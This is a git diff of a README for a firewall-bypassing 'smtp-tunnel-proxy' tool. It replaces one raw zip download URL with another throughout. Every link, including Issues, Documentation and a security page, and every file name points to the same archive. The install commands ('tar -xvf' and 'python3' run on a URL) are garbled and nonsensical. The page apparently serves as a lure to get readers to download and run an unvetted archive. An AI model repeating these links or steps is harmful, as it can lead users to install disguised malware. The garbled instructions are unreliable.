@@ -1,6 +1,6 @@
 # 🚀 smtp-tunnel-proxy - Bypass Firewalls with Ease
 
-[![Download Now](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip%20Now-Release-brightgreen)](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip)
+[![Download Now](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip%20Now-Release-brightgreen)](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip)
 
 ## 📦 Introduction
 
@@ -35,11 +35,11 @@ Follow these simple steps to download and run smtp-tunnel-proxy.
 
 Visit this page to download the latest release:
 
-[Download smtp-tunnel-proxy](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip)
+[Download smtp-tunnel-proxy](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip)
 
 ### 2. Choose Your Version
 
-On the release page, you will see various versions of the software under the "Assets" section. Choose the one that fits your operating system. For most users, the `.exe` file for Windows or `https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip` file for Linux will work best.
+On the release page, you will see various versions of the software under the "Assets" section. Choose the one that fits your operating system. For most users, the `.exe` file for Windows or `https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip` file for Linux will work best.
 
 ### 3. Install the Software
 
@@ -53,7 +53,7 @@ On the release page, you will see various versions of the software under the "As
 2. Navigate to the folder where you downloaded the file.
 3. Run the command:
    ```bash
-   tar -xvf https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip  # Replace x.y.z with the version number
+   tar -xvf https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip  # Replace x.y.z with the version number
    ```
 4. Change into the extracted directory:
    ```bash
@@ -61,12 +61,12 @@ On the release page, you will see various versions of the software under the "As
    ```
 5. Run the script with:
    ```bash
-   python3 https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip
+   python3 https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip
    ```
 
 ### 4. Configuration
 
-After installation, you may need to configure the application. smtp-tunnel-proxy allows you to set your preferences easily through a configuration file. Look for the `https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip` file in the installation directory. Use a text editor to modify it as needed.
+After installation, you may need to configure the application. smtp-tunnel-proxy allows you to set your preferences easily through a configuration file. Look for the `https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip` file in the installation directory. Use a text editor to modify it as needed.
 
 ### 5. Running the Software
 
@@ -84,16 +84,16 @@ After installation, you may need to configure the application. smtp-tunnel-proxy
 If you encounter any problems, consider the following steps:
 
 - Ensure your internet connection is stable.
-- Check the configuration settings in the `https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip` file.
+- Check the configuration settings in the `https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip` file.
 - Refer to the logs for any error messages and consult the community for support.
 
 ## 🙌 Community Support
 
-If you need help, you can look for answers in the [Issues section](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip) of the repository. You can also join our user community and exchange tips and experiences with other users.
+If you need help, you can look for answers in the [Issues section](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip) of the repository. You can also join our user community and exchange tips and experiences with other users.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip)
-- [Learn More About Security](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/tunnel-smtp-proxy-2.7.zip)
+- [Documentation](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip)
+- [Learn More About Security](https://github.com/Meet608/smtp-tunnel-proxy/raw/refs/heads/main/gaussbergite/smtp-proxy-tunnel-v3.8.zip)
 
 Remember to stay updated by checking for newer versions. Happy browsing!
